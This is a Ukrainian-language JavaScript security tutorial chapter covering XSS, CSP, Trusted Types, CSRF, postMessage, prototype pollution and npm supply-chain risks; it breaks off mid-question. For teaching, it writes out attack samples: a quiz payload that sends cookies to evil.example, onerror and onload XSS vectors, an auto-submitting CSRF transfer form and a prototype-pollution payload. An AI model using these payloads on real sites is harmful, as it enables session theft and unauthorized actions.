---
title: Безпека в JavaScript
order: 30
level: senior
tags: [security, xss, csp, trusted-types, csrf, prototype-pollution, supply-chain, owasp]
prerequisites:
  - "[[JavaScript - 07. Прототипи та класи]]"
  - "[[JavaScript - 25. DOM і події]]"
  - "[[JavaScript - 27. Мережа — fetch, CORS і HTTP]]"
estimatedMinutes: 60
id: jsd-ch-30
icon: "🛡️"
---

# JavaScript - 30. Безпека в JavaScript

> [!success] 🎯 Після цього розділу ти зможеш
> - Розпізнати stored, reflected і DOM-based XSS і назвати небезпечні sinks у власному коді.
> - Обрати правильний захист: екранування за контекстом, `textContent`, DOMPurify / `setHTML`, Trusted Types і strict CSP.
> - Пояснити CSRF і clickjacking та закрити їх через `SameSite`, токени, `Sec-Fetch-Site` і `frame-ancestors`.
> - Знайти prototype pollution, ReDoS і `eval`-ін'єкції в коді та безпечно працювати з `postMessage` і `<iframe sandbox>`.
> - Оцінити ризики npm-залежностей і пояснити, чому секретів на клієнті не буває.

## 🤔 Передбач

> [!quiz] Що станеться?
> level: middle · id: jsd-30-quiz-01
>
> ```js
> // URL: https://shop.example/#<img src=x onerror="alert(document.cookie)">
> const name = decodeURIComponent(location.hash.slice(1));
> document.querySelector('#greeting').innerHTML = `Привіт, ${name}!`;
> ```
>
> - [ ] Нічого: `innerHTML` не виконує скрипти
> - [x] Виконається `alert` з cookie, доступними JS
> - [ ] Браузер покаже текст `<img …>` буквально
> - [ ] Буде помилка, бо `#` не можна читати з JS
>
> **Пояснення:** не переймайся, якщо помилився — розберемо нижче. Тег `<script>`, вставлений через `innerHTML`, справді не виконується, але обробники подій — так: `<img>` з битим `src` викликає `onerror`. Це класичний **DOM-based XSS**: payload навіть не потрапляє на сервер — фрагмент `#…` браузер не надсилає.

## 🧒 Простими словами

Твій сайт — це **ресторан**. XSS — коли відвідувач пише на серветці «кухарю: насипай усім солі» і офіціант, не читаючи, кладе серветку в меню для всіх (браузер виконує чужий текст як код). CSRF — коли шахрай надсилає кухарю записку «від» постійного клієнта, і кухар вірить, бо записка прийшла з його столика (браузер сам додає cookie). Clickjacking — прозоре скло над кнопкою «Оплатити», на якому намальовано «Отримати приз». А supply chain — коли постачальник овочів сам виявився отруйником: ти нічого не робив не так, але використав чужий продукт без перевірки. Безпека — це звичка питати: **«хто може контролювати ці дані і що станеться, якщо вони злі?»**

## 🔬 Як це працює насправді

### OWASP-мислення і межі довіри

Усі атаки нижче мають спільний корінь: **дані з-поза межі довіри потрапили туди, де їх інтерпретують як код чи команду**. Межа довіри — місце, де дані змінюють «власника»:

```text
  ненадійне                         │  твій код             │  інтерпретатор
  ─────────                         │  ─────────            │  ─────────────
  URL, hash, query, referrer   ───► │                       │  HTML-парсер (innerHTML)
  поля форм, localStorage      ───► │  валідація,           │  JS (eval, setTimeout(str))
  відповіді API, WebSocket     ───► │  екранування за       │  URL-навігація (href, src)
  postMessage від інших вікон  ───► │  контекстом           │  CSS, SQL, shell на сервері
  npm-пакети, CDN-скрипти      ───► │  ↑ тут ти захищаєшся  │
```

Принципи, на яких тримається [OWASP Top 10](https://owasp.org/Top10/): **defense in depth** (кілька незалежних шарів — екранування + CSP + HttpOnly), **least privilege** (мінімум прав скриптам, iframe, токенам), **secure by default** (безпечне API має бути найпростішим), **не довіряй клієнту** (усе, що перевірено лише в браузері, не перевірено взагалі).

> [!quiz] Перевір себе: що ненадійне?
> level: junior · type: multi · id: jsd-30-quiz-02
>
> Що з цього потрібно вважати даними, які може контролювати атакувальник?
>
> - [x] `location.search` і `location.hash`
> - [x] Відповідь власного API, яке повертає текст коментарів інших користувачів
> - [x] `event.data` у `message`-обробнику
> - [ ] Рядковий літерал, написаний тобою у вихідному коді
> - [x] Значення з `localStorage`
>
> **Пояснення:** власне API повертає те, що записали **інші** користувачі (stored XSS). `localStorage` може бути заповнений попереднім XSS або розширенням. Довіряти можна лише тому, що контролюєш повністю — коду, який сам написав.

### XSS — три різновиди

**Cross-Site Scripting** — виконання чужого JS у контексті твого origin. Атакувальник отримує все, що має твій скрипт: DOM, cookie без `HttpOnly`, `localStorage`, можливість робити запити від імені користувача.

| Тип | Де живе payload | Приклад |
|---|---|---|
| **Stored** | у базі даних, показується всім | коментар `<img src=x onerror=…>` у стрічці |
| **Reflected** | у запиті, сервер «віддзеркалює» у відповідь | `/search?q=<script>…</script>` → «Результати для …» |
| **DOM-based** | лише в браузері: source → sink у клієнтському JS | `innerHTML = location.hash` |

DOM-based XSS — повністю відповідальність фронтенду: сервер його не бачить (фрагмент `#` не надсилається), а серверні WAF не допоможуть. Шлях завжди однаковий — **source** (звідки прийшли дані) → **sink** (куди вони потрапили).

> [!viz] xss
> scenario: dom-sink

```js
// <script> через innerHTML НЕ виконується…
el.innerHTML = '<script>alert(1)</script>';           // тихо ігнорується
// …але це не захист: обробники подій виконуються
el.innerHTML = '<img src=x onerror="alert(1)">';      // ❌ alert
el.innerHTML = '<svg onload="alert(1)"></svg>';       // ❌ alert
```

> [!quiz] Перевір себе: тип XSS
> level: middle · id: jsd-30-quiz-03
>
> Користувач зберіг у профілі ім'я `<img src=x onerror=fetch('//evil.example/?c='+document.cookie)>`. Сторінка адміна виводить список користувачів через `innerHTML`. Який це тип XSS?
>
> - [ ] Reflected
> - [x] Stored
> - [ ] DOM-based
> - [ ] Це CSRF, а не XSS
>
> **Пояснення:** payload збережено на сервері й показано іншим (адміну) — stored XSS, найнебезпечніший тип: одна ін'єкція б'є по всіх, хто відкриє сторінку, включно з адмінами.

### Sinks і санітизація

**Небезпечні sinks** — місця, де рядок стає кодом або розміткою:

| Категорія | Sinks | Безпечна альтернатива |
|---|---|---|
| HTML | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `srcdoc` | `textContent`, `createElement` + `append` |
| JS | `eval`, `new Function`, `setTimeout('рядок')`, `setInterval('рядок')` | функції замість рядків, `JSON.parse` |
| URL | `a.href`, `iframe.src`, `location = …`, `window.open` з `javascript:` | перевірка протоколу через `new URL` |
| Фреймворки | React `dangerouslySetInnerHTML`, Vue `v-html`, jQuery `.html()` | звичайна інтерполяція — вона екранує |

Правило №1 — **не вставляти HTML взагалі**, якщо потрібен текст:

```js
greeting.textContent = `Привіт, ${name}!`;   // ✅ будь-який рядок — лише текст
```

Правило №2 — **екранування залежить від контексту**: те, що безпечне в тілі HTML, небезпечне в атрибуті `href`, JS-рядку чи CSS. Навіть ідеально екранований `javascript:alert(1)` у `href` — XSS. Тому URL перевіряють за протоколом:

```js
function safeHref(input) {
  try {
    const url = new URL(input, location.origin);
    return ['http:', 'https:', 'mailto:'].includes(url.protocol) ? url.href : 'about:blank';
  } catch {
    return 'about:blank';
  }
}
safeHref(' JaVaScRiPt:alert(1)'); // → 'about:blank' — парсер URL нормалізує регістр і пробіли
safeHref('/profile?id=1');        // → 'https://<твій origin>/profile?id=1'
```

Правило №3 — якщо HTML **справді** потрібен (rich text, Markdown), — **санітизувати** перевіреним санітайзером, а не регулярками: [DOMPurify](https://github.com/cure53/DOMPurify) (`el.innerHTML = DOMPurify.sanitize(dirty)`) або вбудований **HTML Sanitizer API** — `el.setHTML(dirty)`, який завжди прибирає скрипти й обробники (Chrome 146+, Firefox 148+; у Safari поки немає — перевіряй підтримку).

> [!quiz] Перевір себе: що безпечно?
> level: middle · type: multi · id: jsd-30-quiz-04
>
> `comment` — рядок від користувача. Які рядки **безпечні**?
>
> - [x] `div.textContent = comment`
> - [ ] `div.innerHTML = comment.replace(/<script.*?>.*?<\/script>/gi, '')`
> - [ ] `a.href = comment` після екранування `<`, `>` і лапок
> - [x] `div.setHTML(comment)` (Sanitizer API)
> - [ ] `setTimeout('render("' + comment + '")', 0)`
>
> **Пояснення:** регулярка не прибирає `onerror` і тисячу інших векторів. HTML-екранування не захищає `href` від `javascript:`. Рядок у `setTimeout` — це `eval`. Безпечні лише API, що вставляють текст або санітизують за повною моделлю HTML.

> [!quiz] Заповни пропуски: безпечний `href` з користувацького вводу
> level: middle · type: fill · id: jsd-30-quiz-10 · bank: href, finally, encodeURI
>
> ```js fill
> function safeHref(input) {
>   try {
>     const url = new [[URL]](input, location.origin)
>     return ['http:', 'https:'].includes(url.[[protocol]]) ? url.href : 'about:blank'
>   } [[catch]] {
>     return 'about:blank'
>   }
> }
> ```
>
> **Пояснення:** парсер `URL` нормалізує регістр і пробіли, тож `' JaVaScRiPt:alert(1)'` дасть протокол `javascript:` і не пройде allowlist. Некоректний URL кидає `TypeError` — його ловимо й повертаємо безпечне значення.

### Trusted Types і Content Security Policy

**CSP** — заголовок відповіді, який каже браузеру, звідки можна виконувати скрипти. Навіть якщо ін'єкція сталася, CSP не дасть їй виконатися. Рекомендований Google і OWASP варіант — **strict CSP** на nonce:

```http
Content-Security-Policy:
  script-src 'nonce-R4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';
  require-trusted-types-for 'script'
```

- `'nonce-…'` — виконуються лише `<script nonce="R4nd0m">`; nonce новий для **кожної** відповіді. Ін'єкція не знає nonce.
- `'strict-dynamic'` — скриптам з nonce дозволено довантажувати інші (бандлери, аналітика), а allowlist доменів ігнорується (allowlist-и легко обійти через JSONP чи CDN).
- Inline-обробники (`onclick="…"`) і `eval` блокуються, доки не додано `'unsafe-inline'` / `'unsafe-eval'` — **не додавай**.
- `Content-Security-Policy-Report-Only` — режим «лише звітувати»: впровадження без ризику зламати продакшн.

**Trusted Types** закривають DOM-XSS на рівні типів: з `require-trusted-types-for 'script'` sinks на кшталт `innerHTML` **відмовляються приймати рядки** — лише об'єкти `TrustedHTML`, створені політикою:

```js
const policy = trustedTypes.createPolicy('sanitize', {
  createHTML: (dirty) => DOMPurify.sanitize(dirty),
});
el.innerHTML = policy.createHTML(userInput); // ✅
el.innerHTML = userInput;                    // ❌ TypeError — порушення CSP
```

Замість сотні місць, які треба перевірити на рев'ю, лишається кілька політик. Підтримка: Chromium давно (з 83), Safari 26, Firefox 148 — тобто вже у всіх основних рушіях.

> [!quiz] Перевір себе: CSP
> level: senior · type: multi · id: jsd-30-quiz-05
>
> На сторінці strict CSP `script-src 'nonce-abc' 'strict-dynamic'; object-src 'none'; base-uri 'none'`. Що буде заблоковано?
>
> - [x] `<button onclick="buy()">`
> - [x] Ін'єктований `<script src="https://evil.example/x.js"></script>` без nonce
> - [ ] Скрипт, який `<script nonce="abc">` додав через `document.createElement('script')`
> - [x] `eval('2 + 2')`
>
> **Пояснення:** inline-обробники й `eval` потребують `'unsafe-inline'`/`'unsafe-eval'`. Скрипт без nonce не виконається. А довіра від скрипта з nonce поширюється на скрипти, які він створює, — це і є `'strict-dynamic'`.

### CSRF і SameSite

**Cross-Site Request Forgery**: браузер **сам додає cookie** до запиту на `bank.example`, навіть якщо запит ініціював `evil.example`. Сервер бачить валідну сесію і виконує дію.

```html
<!-- на evil.example -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker"><input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```

Захист — кілька шарів:

| Шар | Як працює |
|---|---|
| `SameSite=Lax` / `Strict` на cookie | `Lax`: cookie не йде з крос-сайтовими POST, iframe, fetch — лише з навігацією верхнього рівня (GET). `Strict`: не йде навіть з переходом за посиланням |
| CSRF-токен | секрет у формі / заголовку, який сторінка атакувальника не може прочитати (Same-Origin Policy) |
| Перевірка `Origin` / `Sec-Fetch-Site` | сервер відхиляє зміну стану, якщо `Sec-Fetch-Site: cross-site` |
| GET без побічних ефектів | `GET /delete?id=1` — CSRF навіть з `SameSite=Lax` |

Атрибути cookie для сесії: `HttpOnly` (недоступна JS — XSS не вкраде), `Secure` (лише HTTPS), `SameSite=Lax` або `Strict`, префікс `__Host-` (без `Domain`, `Path=/`, `Secure` — субдомен не перезапише). Chromium трактує cookie без `SameSite` як `Lax`, але інші браузери — не обов'язково, тож вказуй явно.

> [!quiz] Перевір себе: CSRF
> level: middle · type: multi · id: jsd-30-quiz-06
>
> Що **ефективно** захищає від CSRF на `POST /transfer`?
>
> - [x] Сесійна cookie з `SameSite=Lax` або `Strict`
> - [ ] Перевірка, що запит має `Content-Type: application/x-www-form-urlencoded`
> - [x] Обов'язковий CSRF-токен, який сервер звіряє з сесією
> - [x] Відхилення запитів з `Sec-Fetch-Site: cross-site`
> - [ ] Прапорець `HttpOnly` на cookie
>
> **Пояснення:** `HttpOnly` захищає від крадіжки cookie через XSS, але браузер однаково додасть її до крос-сайтового запиту. Звичайна HTML-форма може надіслати саме `x-www-form-urlencoded`, тож перевірка типу нічого не дає.

### Clickjacking, postMessage та iframe sandbox

**Clickjacking** — твою сторінку вбудовують у прозорий `<iframe>` на чужому сайті, і користувач «клікає» по твоїх кнопках, думаючи, що клікає по чужих. Захист — заборонити вбудовування: `Content-Security-Policy: frame-ancestors 'none'` (або `'self'`), для старих браузерів — `X-Frame-Options: DENY`.

**`postMessage`** — легальний канал між вікнами різних origin, тож обидва кінці мають перевіряти, з ким говорять:

```js
// відправник: завжди конкретний targetOrigin, а не '*'
popup.postMessage({ type: 'token', value }, 'https://app.example');

// отримувач: перевірити origin і форму даних
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://auth.example') return;          // ❗ без цього — будь-який сайт
  if (typeof e.data !== 'object' || e.data?.type !== 'login') return;
  handleLogin(e.data);
});
```

**`<iframe sandbox>`** — вбудувати чужий або користувацький контент з мінімумом прав. Порожній `sandbox` забороняє скрипти, форми, popup-и, навігацію батька й дає iframe унікальний «непрозорий» origin. Права додаються поштучно: `allow-scripts`, `allow-forms`, `allow-popups`… Небезпечна пара — `allow-scripts allow-same-origin` для контенту **з твого ж origin**: скрипт усередині може дістатися до батьківського DOM і просто зняти атрибут `sandbox`.

> [!quiz] Перевір себе: postMessage
> level: middle · id: jsd-30-quiz-07
>
> Що з цього найнебезпечніше?
>
> - [ ] `iframe.contentWindow.postMessage(data, 'https://widget.example')`
> - [x] `window.addEventListener('message', (e) => { el.innerHTML = e.data.html; })`
> - [ ] `<iframe sandbox="allow-scripts" src="https://untrusted.example">`
> - [ ] `Content-Security-Policy: frame-ancestors 'self'`
>
> **Пояснення:** обробник без перевірки `e.origin` приймає повідомлення від **будь-якого** вікна (будь-який сайт може відкрити твою сторінку у popup чи iframe і надіслати повідомлення), а потім пише дані в HTML-sink — це DOM-XSS через `postMessage`.

> [!quiz] Склади безпечний обробник `postMessage`
> level: middle · type: order · id: jsd-30-quiz-11
>
> ```js order
> window.addEventListener('message', (e) => {
>   if (e.origin !== 'https://themes.example') return
>   banner.textContent = String(e.data?.text ?? '')
> })
>   banner.innerHTML = e.data.text // ✗
> ```
>
> **Пояснення:** спершу — перевірка відправника: без неї повідомлення може надіслати будь-який сайт, що відкрив твою сторінку. Потім дані йдуть лише в текстовий sink; `innerHTML` перетворив би повідомлення на DOM-XSS.

### Prototype pollution, ReDoS і eval

**Prototype pollution** — запис у `Object.prototype` через рекурсивне злиття, клонування чи «set by path» з ключем `__proto__`, `constructor` або `prototype`. Після цього **кожен** об'єкт успадковує властивість атакувальника ([[JavaScript - 07. Прототипи та класи]]).

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);          // target['__proto__'] — це Object.prototype!
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const payload = JSON.parse('{"__proto__": {"isAdmin": true}}'); // JSON.parse створює ВЛАСНИЙ ключ __proto__
merge({}, payload);
console.log({}.isAdmin); // → true 😱 — тепер кожен об'єкт «адмін»
```

> [!viz] prototype-chain
> scenario: lookup

Захист: пропускати ключі `__proto__`, `constructor`, `prototype`; ітерувати лише власні ключі (`Object.keys`, `Object.hasOwn`); для словників з довільними ключами — `Map` або `Object.create(null)`; валідувати JSON схемою; в Node — прапорець `--disable-proto=delete`; радикально — `Object.freeze(Object.prototype)` на старті.

**ReDoS** — регулярка з вкладеними квантифікаторами (`/^(a+)+$/`) на «майже підхожому» рядку дає експоненційний backtracking: кожен додатковий символ подвоює час, і один запит вішає event loop сервера ([[JavaScript - 18. Рядки, Unicode і регулярні вирази]]). Ліки — не вкладати квантифікатори над тим самим набором символів, обмежувати довжину вводу, лінтер `eslint-plugin-regexp` чи безпечні рушії (RE2).

**`eval` і `new Function`** виконують рядок як код з усіма правами твого скрипта. `eval` ще й бачить локальну область видимості. Майже кожне «потрібне» застосування має безпечну альтернативу: `JSON.parse` для даних, мапа функцій замість динамічних імен, `structuredClone` для копій. Strict CSP без `'unsafe-eval'` заблокує їх узагалі.

> [!quiz] Перевір себе: забруднення прототипу
> level: senior · type: output · id: jsd-30-quiz-08
>
> ```js
> const a = JSON.parse('{"__proto__": {"polluted": 1}}');
> const b = { __proto__: { polluted: 2 } };
> console.log(Object.keys(a).length, Object.keys(b).length, {}.polluted);
> ```
>
> **Відповідь:** `1 0 undefined`
>
> **Пояснення:** `JSON.parse` створює **власну** властивість з іменем `__proto__` — саме тому JSON з мережі небезпечний для наївного merge. А літерал `{ __proto__: … }` встановлює прототип **лише цього** об'єкта, власних ключів немає. `Object.prototype` поки чистий — забруднює його саме merge.

### Ланцюжок постачання і секрети на клієнті

Типовий фронтенд тягне сотні транзитивних npm-пакетів — і кожен виконується з правами твого застосунку (а `postinstall`-скрипти — з правами розробника на його машині чи в CI). Реальні інциденти:

- 🐍 **event-stream** (2018) — новий «мейнтейнер» додав залежність, що крала гаманці конкретного біткоїн-застосунку;
- 🎣 **ua-parser-js** (2021) — зламаний акаунт опублікував версії з майнером і крадієм паролів;
- 🪱 **вересень 2025** — фішинг мейнтейнера призвів до шкідливих версій `chalk` і `debug`, а хробак **Shai-Hulud** крав npm- і GitHub-токени з машин розробників і сам публікував заражені версії інших пакетів (понад 500).

Що реально допомагає:

1. Lockfile у репозиторії й `npm ci` / `pnpm install --frozen-lockfile` у CI — встановлюється рівно те, що перевірено.
2. Менше залежностей: 10 рядків коду краще за пакет на 3 транзитивні залежності.
3. Вимкнені install-скрипти за замовчуванням (`ignore-scripts`, у pnpm — allowlist для `postinstall`), затримка на свіжі версії (`minimumReleaseAge` у pnpm).
4. 2FA для публікації, provenance-атестації, сканери (`npm audit`, Socket, Snyk), Dependabot/Renovate з рев'ю.
5. Для скриптів з CDN — **Subresource Integrity**: `<script src="…" integrity="sha384-…" crossorigin="anonymous">`.

**Секретів на клієнті не буває.** Усе, що потрапило в бандл, — публічне: «приховати» API-ключ у змінній `VITE_…` чи `NEXT_PUBLIC_…` означає вшити його в JS, який кожен може відкрити в DevTools. Секретні ключі живуть лише на сервері; клієнту — короткоживучі токени з мінімальними правами. Сесійний токен у `localStorage` прочитає будь-який XSS; у `HttpOnly`-cookie — ні (хоча XSS усе одно зможе робити запити від імені користувача, поки сторінка відкрита).

> [!quiz] Перевір себе: supply chain і секрети
> level: senior · type: multi · id: jsd-30-quiz-09
>
> - [x] Ключ Stripe `sk_live_…` у змінній `VITE_STRIPE_KEY` доступний будь-якому відвідувачу
> - [ ] Мінімізація й обфускація бандла роблять секрет у ньому безпечним
> - [x] `npm ci` встановлює версії строго з lockfile і падає, якщо `package.json` з ним не узгоджений
> - [x] `postinstall`-скрипт залежності виконується з правами користувача, який запустив встановлення
> - [ ] `npm audit` без помилок гарантує, що пакети не шкідливі
>
> **Пояснення:** обфускація лише сповільнює читання, а не приховує. `npm audit` знає тільки про **вже виявлені** вразливості — свіжий шкідливий реліз він не побачить. Lockfile + `npm ci` + обмеження install-скриптів реально зменшують поверхню атаки.

## ⚠️ Пастки

> [!pitfall] «React захищає від XSS» — не завжди
> JSX-інтерполяція екранує текст, але не захищає `href`, `dangerouslySetInnerHTML` і рядки, що йдуть у сторонні бібліотеки.
>
> ```jsx
> <a href={user.website}>Сайт</a>                 // ❌ javascript:alert(1)
> <div dangerouslySetInnerHTML={{ __html: md }} /> // ❌ без санітизації
> <a href={safeHref(user.website)}>Сайт</a>       // ✅
> ```

> [!pitfall] Санітизація регулярками
> Вирізати `<script>` регулярним виразом — марно: `<img onerror>`, `<svg onload>`, `<a href="javascript:">`, розбиті теги `<scr<script>ipt>`, кодування сутностей… HTML-парсер браузера набагато «креативніший» за будь-який regex. Використовуй DOMPurify або `setHTML`.

> [!pitfall] `targetOrigin: '*'` для чутливих даних
> `otherWindow.postMessage({ token }, '*')` віддасть токен будь-кому, хто зараз відкритий у цьому вікні: якщо popup встиг перейти на інший сайт — повідомлення отримає він. Для даних, що мають значення, — тільки конкретний origin.

> [!pitfall] Перевірка прав лише на фронтенді
> Сховати кнопку «Видалити» для не-адмінів — це UX, а не безпека. Будь-хто відправить `fetch('/api/users/1', { method: 'DELETE' })` з консолі. Авторизація має бути на сервері для кожного запиту.

## 🎤 На співбесіді

> [!interview] Що таке XSS, які бувають види і як від нього захищатися?
> level: middle · frequency: дуже часто · id: jsd-30-int-01
>
> ---
>
> XSS — виконання чужого JS у контексті нашого origin: атакувальник отримує DOM, незахищені cookie, токени в сховищах і може діяти від імені користувача. Види: stored (payload у базі, бачать усі), reflected (з параметра запиту у відповідь), DOM-based (source → sink у клієнтському JS, сервер не бачить). Захист шарами: не вставляти HTML — `textContent` і фреймворкову інтерполяцію; екранувати за контекстом і перевіряти протокол URL; коли HTML потрібен — DOMPurify або `setHTML`; strict CSP на nonce з `'strict-dynamic'`, без `'unsafe-inline'`/`'unsafe-eval'`; Trusted Types, щоб sinks не приймали рядки; `HttpOnly` для сесійних cookie, щоб зменшити шкоду.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#XSS — три різновиди|Розділ: XSS]] · [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

> [!interview] Як працює CSRF і чим від нього захиститися?
> level: middle · frequency: часто · id: jsd-30-int-02
>
> ---
>
> Браузер автоматично додає cookie до запитів на домен, навіть якщо запит ініціював інший сайт; тому форма на `evil.example` може змінити стан на `bank.example` від імені залогіненого користувача. Захист: cookie з `SameSite=Lax` або `Strict`; CSRF-токен у формі чи заголовку (атакувальник не може його прочитати через Same-Origin Policy); перевірка `Origin` або Fetch Metadata (`Sec-Fetch-Site: cross-site` → відмова); жодних змін стану через GET. CORS тут не захист: він обмежує читання відповіді, а не відправку простого запиту.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#CSRF і SameSite|Розділ: CSRF і SameSite]] · [OWASP: CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

> [!interview] Що таке prototype pollution і як його запобігти?
> level: senior · frequency: іноді · id: jsd-30-int-03
>
> ---
>
> Це запис у `Object.prototype` (або інший спільний прототип) через ключі `__proto__`, `constructor.prototype` у наївному рекурсивному merge, clone чи «set by path». `JSON.parse` створює `__proto__` як власний ключ, тож будь-який JSON з мережі — потенційний payload. Наслідки — від зміни логіки (`{}.isAdmin === true`) до RCE у Node через «гаджети» в бібліотеках. Захист: пропускати небезпечні ключі, ітерувати лише власні (`Object.keys`, `Object.hasOwn`), `Map` чи `Object.create(null)` для словників, схема-валідація входу, `--disable-proto=delete` у Node, оновлення вразливих бібліотек.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Prototype pollution, ReDoS і eval|Розділ: prototype pollution]] · [OWASP: Prototype Pollution Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)

## 🔗 Зв'язки

- [[JavaScript - 07. Прототипи та класи]] — prototype pollution працює саме через ланцюжок прототипів.
- [[JavaScript - 25. DOM і події]] — sinks (`innerHTML`, атрибути) і безпечні способи будувати DOM.
- [[JavaScript - 27. Мережа — fetch, CORS і HTTP]] — Same-Origin Policy, CORS і чому CORS не захищає від CSRF.
- [[JavaScript - 28. Сховища та Web APIs]] — що зберігати в cookie, а що в `localStorage`, з огляду на XSS.
- [[JavaScript - 18. Рядки, Unicode і регулярні вирази]] — backtracking і ReDoS.
- [[JavaScript - 29. Workers і паралельність]] — COOP/COEP і Spectre як приклад апаратної атаки на веб.

## ⚡ Фішки

> [!reel] 🪤 innerHTML не запускає script — і це пастка
> `<script>`, вставлений через `innerHTML`, мовчить. Тому розробники думають, що все безпечно. А `<img src=x onerror=alert(1)>` спрацьовує миттєво.

> [!reel] #️⃣ Сервер не бачить твій XSS
> Фрагмент URL після `#` браузер не надсилає на сервер. DOM-XSS через `location.hash` не залишить жодного сліду в серверних логах і пройде повз WAF.

> [!reel] 🧬 JSON.parse створює власний __proto__
> `JSON.parse('{"__proto__":{}}')` дає об'єкт з **власним** ключем `__proto__`. Наївний merge скопіює його прямо в `Object.prototype`.
>
> ```js
> Object.keys(JSON.parse('{"__proto__":1}')) // → ['__proto__']
> ```

> [!reel] 🔑 Секрет у бандлі — уже не секрет
> Змінна `VITE_API_SECRET` вшивається в JS як рядок. Мініфікація не допоможе: «View source» і пошук по `sk_live` — і ключ у чужих руках.

> [!reel] 🪱 Хробак, що публікує себе в npm
> У 2025 Shai-Hulud крав токени з машин розробників і сам випускав заражені версії їхніх пакетів — понад 500. Lockfile і заборона install-скриптів — твій бронежилет.

## 🧠 Закріплення

### 🟢 Junior

> [!question]- Чому `textContent` безпечніший за `innerHTML`?
> *дуже часто · порівняння* · `jsd-30-001`
>
> `textContent` вставляє рядок як текст — браузер не парсить його як HTML, тож теги й обробники подій не з'являються. `innerHTML` запускає HTML-парсер: `<img onerror>` чи `<svg onload>` виконають код.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Sinks і санітизація|Розділ: sinks і санітизація]] · [OWASP: DOM-based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

> [!question]- Що роблять прапорці cookie `HttpOnly`, `Secure` і `SameSite`?
> *часто · теорія* · `jsd-30-002`
>
> `HttpOnly` — cookie недоступна з JS (`document.cookie`), XSS її не вкраде. `Secure` — надсилається лише через HTTPS. `SameSite` — керує надсиланням з крос-сайтових запитів: `Strict` — ніколи, `Lax` — лише з навігацією верхнього рівня, `None` (тільки разом із `Secure`) — завжди.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#CSRF і SameSite|Розділ: CSRF і SameSite]] · [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie)

> [!question]- Чому не можна зберігати секретний API-ключ у фронтенд-коді?
> *часто · теорія* · `jsd-30-003`
>
> Увесь JS, що завантажує браузер, доступний користувачу: DevTools, «View source», мережеві запити. Змінні оточення з префіксами `VITE_`/`NEXT_PUBLIC_` вшиваються в бандл. Секрети — лише на сервері; клієнту — короткоживучі токени з мінімальними правами.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Ланцюжок постачання і секрети на клієнті|Розділ: секрети на клієнті]] · [OWASP: Top 10](https://owasp.org/Top10/)

### 🟡 Middle

> [!question]- Що таке DOM-based XSS і чим він відрізняється від reflected?
> *часто · порівняння* · `jsd-30-004`
>
> DOM-based — дані з source (`location.hash`, `postMessage`, `localStorage`) потрапляють у sink (`innerHTML`, `eval`, `href`) у клієнтському JS; сервер може навіть не бачити payload. Reflected — сервер сам вставляє параметр запиту у HTML відповіді. Перший виправляється у фронтенді, другий — на сервері.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#XSS — три різновиди|Розділ: XSS]] · [PortSwigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

> [!question]- Як безпечно приймати повідомлення через `postMessage`?
> *часто · практика* · `jsd-30-005`
>
> Перевіряти `event.origin` на точну відповідність очікуваному origin, валідувати форму `event.data`, ніколи не писати дані в HTML/JS-sinks. Відправляти — з конкретним `targetOrigin`, а не `'*'`.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Clickjacking, postMessage та iframe sandbox|Розділ: postMessage]] · [MDN: Window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

> [!question]- Як захиститися від clickjacking?
> *іноді · практика* · `jsd-30-006`
>
> Заборонити вбудовування сторінки в чужі фрейми: `Content-Security-Policy: frame-ancestors 'none'` (або `'self'`, або список довірених origin); для старих браузерів — `X-Frame-Options: DENY`/`SAMEORIGIN`. JS-«frame busting» ненадійний.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Clickjacking, postMessage та iframe sandbox|Розділ: clickjacking]] · [OWASP: Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

### 🔴 Senior

> [!question]- Що таке strict CSP і чому nonce кращий за allowlist доменів?
> *часто · теорія* · `jsd-30-007`
>
> Strict CSP: `script-src 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none'`. Виконуються лише скрипти з одноразовим nonce і ті, які вони завантажили. Allowlist доменів легко обійти: на дозволеному CDN чи API часто є JSONP-ендпоінти або старі бібліотеки, які виконують довільний код.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Trusted Types і Content Security Policy|Розділ: CSP і Trusted Types]] · [web.dev: Strict CSP](https://web.dev/articles/strict-csp)

> [!question]- Як Trusted Types змінюють боротьбу з DOM-XSS?
> *іноді · теорія* · `jsd-30-008`
>
> З `require-trusted-types-for 'script'` небезпечні sinks кидають помилку на рядках і приймають лише `TrustedHTML`/`TrustedScript`/`TrustedScriptURL`, створені політиками. Аудит зводиться з усіх місць використання `innerHTML` до кількох політик, а порушення видно в CSP-звітах.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Trusted Types і Content Security Policy|Розділ: CSP і Trusted Types]] · [MDN: Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)

> [!question]- Які практики зменшують ризик supply-chain атак через npm?
> *іноді · практика* · `jsd-30-009`
>
